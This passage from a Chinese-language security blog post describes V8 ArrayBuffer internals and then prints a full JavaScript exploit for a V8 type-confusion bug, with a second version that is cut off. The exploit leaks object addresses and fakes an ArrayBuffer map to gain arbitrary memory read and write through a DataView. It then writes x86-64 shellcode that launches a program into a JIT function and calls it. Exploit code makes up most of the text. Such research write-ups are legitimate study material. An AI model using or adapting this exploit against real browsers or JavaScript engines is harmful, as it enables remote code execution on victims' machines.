[t32[1],t32[0]]</li></ul>  <strong>–&gt;k是6.953328187651540e-310,将字节序列按照4个字节去分开，然后解释为Uint32,于是得到:</strong><br>  <strong>k=[0x00007fff，0xdeadbeef]</strong></li></ul></li></ul><h4 id="JSArrayBuffer-1"><a href="#JSArrayBuffer-1" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h4><ul><li>持有ArrayBuffer的对象<ul><li>继承Object，HeapObject，JSReceiver，JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-155703.png" alt=""></li></ul></li></ul></li><li>实际演示<ul><li>存放TypedArray</li><li>使用长度0x13370搜索ArrayBuffer的内存位置<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-160126.png" alt=""></li><li>在V8中，对象通常被存放在由GC管理的mapped区域，然而BackingStore是一个不被GC管理的区域，并且被存放在heap中(在图中，可以看到malloc块有prev_size和size成员）<br>此外，由于它不是由GC管理的HeapObject，因此指向BackingStore的指针不是Tagged Value（末尾不能为1）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-160917.png" alt=""></li><li>虽然在ArrayBuffer中描述了大小，但如果将此值重写为较大的值，则可以允许读取和写入的长度，超出BackingStore数组的范围。</li><li><strong>同样，如果您可以重写BackingStore指针，则可以读取和写入任意内存地址，这些是在exploit中常用的方法。</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-162614.png" alt=""></li></ul></li></ul><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><p>我写了两个版本的exp，思路一样，但是写法稍微有点不同，版本一相对简洁舒服一些，版本二感觉会稳定一点。</p><h4 id="版本1"><a href="#版本1" class="headerlink" title="版本1"></a>版本1</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">1024</span> * <span class="number">1024</span> *<span class="number">16</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">String</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d2u</span>(<span class="params">num1,num2</span>)</span>&#123;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">2</span>);</span><br><span class="line">    d[<span class="number">0</span>] = num2;</span><br><span class="line">    d[<span class="number">1</span>] = num1;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(d.buffer);</span><br><span class="line">    <span class="keyword">return</span> f[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u2d</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line">    f[<span class="number">0</span>] = num;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(f.buffer);</span><br><span class="line">    <span class="keyword">return</span> d[<span class="number">1</span>] * <span class="number">0x100000000</span> + d[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change_to_float</span>(<span class="params">intarr,floatarr</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; intarr.length;i = i+<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> re = d2u(intarr[i+<span class="number">1</span>],intarr[i]);</span><br><span class="line">        floatarr[j] = re;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak出object的地址，即将一个object当成double读出来</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params">arr,callback</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> v=arr[<span class="number">0</span>];</span><br><span class="line">    callback();</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将一个数当成object写进去</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger2</span>(<span class="params">arr, callback, val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> v = arr[<span class="number">0</span>];</span><br><span class="line">    callback();</span><br><span class="line">    arr[<span class="number">0</span>] = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> nop = <span class="number">0xdaba0000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 伪造ArrayBuffer的map</span></span><br><span class="line"><span class="keyword">var</span> ab_map_obj = [</span><br><span class="line">    nop,nop,</span><br><span class="line">    <span class="number">0x0f00000a</span>,<span class="number">0x001900c6</span>,<span class="number">0x082003ff</span>,<span class="number">0x0</span>,</span><br><span class="line">    nop,nop,   <span class="comment">// use ut32.prototype replace it</span></span><br><span class="line">    nop,nop,<span class="number">0x0</span>,<span class="number">0x0</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">arr0=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"><span class="comment">// leak arraybuffer的prototype和constructor</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr0[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr0, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=u2d(trigger(arr0,evil_r0));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ab_proto_addr=read_obj_addr(ab.__proto__);</span><br><span class="line">print(<span class="string">"要被leak的ArrayBuffer"</span>);</span><br><span class="line">%DebugPrint(ab);</span><br><span class="line">print(ab_proto_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_constructor_addr = ab_proto_addr - <span class="number">0x1b0</span>;</span><br><span class="line">print(ab_constructor_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//用ab_proto_addr和ab_constructor_addr替换fake map中的nop</span></span><br><span class="line">ab_map_obj[<span class="number">0x6</span>] = ab_proto_addr &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">ab_map_obj[<span class="number">0x7</span>] = ab_proto_addr / <span class="number">0x100000000</span>;</span><br><span class="line">ab_map_obj[<span class="number">0x8</span>] = ab_constructor_addr &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">ab_map_obj[<span class="number">0x9</span>] = ab_constructor_addr / <span class="number">0x100000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ab_map_obj_float = [<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>];</span><br><span class="line"><span class="comment">// 将int array转换成double array</span></span><br><span class="line">change_to_float(ab_map_obj,ab_map_obj_float);</span><br><span class="line"><span class="comment">// 此处gc是为了将ab_map_obj_float放入到old space里，</span></span><br><span class="line"><span class="comment">// 如果没有gc则ab_map_obj_float会在后续的leak中由于gc而被迁移</span></span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line"><span class="comment">// gc();</span></span><br><span class="line">print(<span class="string">"要leak出的ab_map_obj_float的数组"</span>);</span><br><span class="line">%DebugPrint(ab_map_obj_float);</span><br><span class="line"><span class="comment">// leak ab_map_obj_float的地址</span></span><br><span class="line"></span><br><span class="line">arr1=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr1</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr1[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr1, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=u2d(trigger(arr1,evil_r1));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">ab_map_obj_addr=read_obj_addr1(ab_map_obj_float)+<span class="number">0x280</span>+<span class="number">0x10</span>;</span><br><span class="line">print(ab_map_obj_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab = [</span><br><span class="line">    ab_map_obj_addr &amp; <span class="number">0xffffffff</span>, ab_map_obj_addr / <span class="number">0x100000000</span>,</span><br><span class="line">    ab_map_obj_addr &amp; <span class="number">0xffffffff</span>, ab_map_obj_addr / <span class="number">0x100000000</span>,</span><br><span class="line">    ab_map_obj_addr &amp; <span class="number">0xffffffff</span>, ab_map_obj_addr / <span class="number">0x100000000</span>,</span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0x4000</span>, <span class="comment">/* buffer length */</span></span><br><span class="line">    <span class="number">0x12345678</span>,<span class="number">0x123</span>,<span class="comment">/* buffer address */</span></span><br><span class="line">    <span class="number">0x4</span>,<span class="number">0x0</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">var</span> fake_ab_float = [<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>];</span><br><span class="line">change_to_float(fake_ab,fake_ab_float);</span><br><span class="line">gc();</span><br><span class="line">arr2=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr2</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr2[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr2, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=u2d(trigger(arr2,evil_r2));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"要leak出的fake_ab_float的数组"</span>);</span><br><span class="line">%DebugPrint(fake_ab_float);</span><br><span class="line">fake_ab_float_addr=read_obj_addr2(fake_ab_float)+<span class="number">0x300</span>+<span class="number">0x10</span>;</span><br><span class="line">print(fake_ab_float_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">fake_ab_float_addr_f = d2u(fake_ab_float_addr / <span class="number">0x100000000</span>,fake_ab_float_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">print(fake_ab_float_addr_f + <span class="string">'\n\n\n'</span>);</span><br><span class="line">arrr=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_w0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arrr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">        %DebugPrint(arrr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger2(arrr, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;,<span class="number">1.1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// print("arrr first is");</span></span><br><span class="line">    <span class="comment">// %DebugPrint(arrr);</span></span><br><span class="line">    trigger2(arrr,evil_w0,fake_ab_float_addr_f);</span><br><span class="line">&#125;</span><br><span class="line">write_obj_addr(fake_ab_float_addr_f);</span><br><span class="line">print(<span class="string">"arrr last is"</span>);</span><br><span class="line">%DebugPrint(arrr);</span><br><span class="line"><span class="comment">//DataView(ArrayBuffer buffer [, 字节起始位置 [, 长度]]);</span></span><br><span class="line">fake_dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(arrr[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x4000</span>);</span><br><span class="line">%DebugPrint(fake_dv);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> evil_f = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"var a = 1000000"</span>);</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">print(<span class="string">"要read的function"</span>);</span><br><span class="line">%DebugPrint(evil_f);</span><br><span class="line">arr3=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr3</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr3[<span class="number">0</span>] = object;</span><br><span class="line">        %DebugPrint(arr3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr3, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=u2d(trigger(arr3,evil_r3));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">shellcode_address_ref=read_obj_addr3(evil_f)+<span class="number">0x38</span><span class="number">-1</span>;</span><br><span class="line">print(shellcode_address_ref.toString(<span class="number">16</span>));</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Read32</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">    fake_ab_float[<span class="number">4</span>] = d2u(addr / <span class="number">0x100000000</span>,addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="comment">//fake_dv = new DataView(fake_arraybuffer,0,0x4000);</span></span><br><span class="line">    <span class="comment">//print(fake_ab_float[4]);</span></span><br><span class="line">    <span class="comment">//get方法的参数都是一个字节序号（不能是负数，否则会报错），表示从哪个字节开始读取。</span></span><br><span class="line">    <span class="comment">//如果一次读取两个或两个以上字节，就必须明确数据的存储方式，到底是小端字节序还是大端字节序。</span></span><br><span class="line">    <span class="comment">//默认情况下，DataView的get方法使用大端字节序解读数据，如果需要使用小端字节序解读，必须在get方法的第二个参数指定true。</span></span><br><span class="line">    <span class="keyword">return</span> fake_dv.getUint32(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Write32</span>(<span class="params">addr,value</span>)</span>&#123;</span><br><span class="line">    fake_ab_float[<span class="number">4</span>] = d2u(addr / <span class="number">0x100000000</span>,addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="comment">//fake_dv = new DataView(fake_arraybuffer,0,0x4000);</span></span><br><span class="line">    <span class="comment">//print(fake_ab_float[4]);</span></span><br><span class="line">    print(<span class="string">"write"</span>);</span><br><span class="line">    fake_dv.setUint32(<span class="number">0</span>,value,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shellcode_address = Read32(shellcode_address_ref) + Read32(shellcode_address_ref+<span class="number">0x4</span>) * <span class="number">0x100000000</span>;;</span><br><span class="line">print(shellcode_address.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">var</span> addr = shellcode_address<span class="number">-1</span>+<span class="number">0x60</span>;</span><br><span class="line">fake_ab_float[<span class="number">4</span>] = d2u(addr / <span class="number">0x100000000</span>,addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line"><span class="keyword">var</span> shellcode=[<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0x782fb848</span>,<span class="number">0x636c6163</span>,<span class="number">0x48500000</span>,<span class="number">0x73752fb8</span>,<span class="number">0x69622f72</span>,<span class="number">0x8948506e</span>,<span class="number">0xc03148e7</span>,<span class="number">0x89485750</span>,<span class="number">0xd23148e6</span>,<span class="number">0x3ac0c748</span>,<span class="number">0x50000030</span>,<span class="number">0x4944b848</span>,<span class="number">0x414c5053</span>,<span class="number">0x48503d59</span>,<span class="number">0x3148e289</span>,<span class="number">0x485250c0</span>,<span class="number">0xc748e289</span>,<span class="number">0x00003bc0</span>,<span class="number">0x050f00</span>];</span><br><span class="line"><span class="comment">// shellcode[0] = 0x90909090;</span></span><br><span class="line"><span class="comment">// shellcode[1] = 0x90909090;</span></span><br><span class="line"><span class="comment">// shellcode[2] = 0x782fb848;</span></span><br><span class="line"><span class="comment">// shellcode[3] = 0x636c6163;</span></span><br><span class="line"><span class="comment">// shellcode[4] = 0x48500000;</span></span><br><span class="line"><span class="comment">// shellcode[5] = 0x73752fb8;</span></span><br><span class="line"><span class="comment">// shellcode[6] = 0x69622f72;</span></span><br><span class="line"><span class="comment">// shellcode[7] = 0x8948506e;</span></span><br><span class="line"><span class="comment">// shellcode[8] = 0xc03148e7;</span></span><br><span class="line"><span class="comment">// shellcode[9] = 0x89485750;</span></span><br><span class="line"><span class="comment">// shellcode[10] = 0xd23148e6;</span></span><br><span class="line"><span class="comment">// shellcode[11] = 0x3ac0c748;</span></span><br><span class="line"><span class="comment">// shellcode[12] = 0x50000030;</span></span><br><span class="line"><span class="comment">// shellcode[13] = 0x4944b848;</span></span><br><span class="line"><span class="comment">// shellcode[14] = 0x414c5053;</span></span><br><span class="line"><span class="comment">// shellcode[15] = 0x48503d59;</span></span><br><span class="line"><span class="comment">// shellcode[16] = 0x3148e289;</span></span><br><span class="line"><span class="comment">// shellcode[17] = 0x485250c0;</span></span><br><span class="line"><span class="comment">// shellcode[18] = 0xc748e289;</span></span><br><span class="line"><span class="comment">// shellcode[19] = 0x00003bc0;</span></span><br><span class="line"><span class="comment">// shellcode[20] = 0x050f00;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length;i++)&#123;</span><br><span class="line"><span class="keyword">var</span> value = shellcode[i];</span><br><span class="line">fake_dv.setUint32(i * <span class="number">4</span>,value,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"go to shellcode!"</span>);</span><br><span class="line">evil_f();</span><br></pre></td></tr></table></figure><h4 id="版本2-工具类在上面"><a href="#版本2-工具类在上面" class="headerlink" title="版本2(工具类在上面)"></a>版本2(工具类在上面)</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// leak出object的地址，即将一个object当成double读出来</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params">arr,callback</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> v=arr[<span class="number">0</span>];</span><br><span class="line">    callback();</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将一个数当成object写进去</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger2</span>(<span class="params">arr, callback, val</span>) 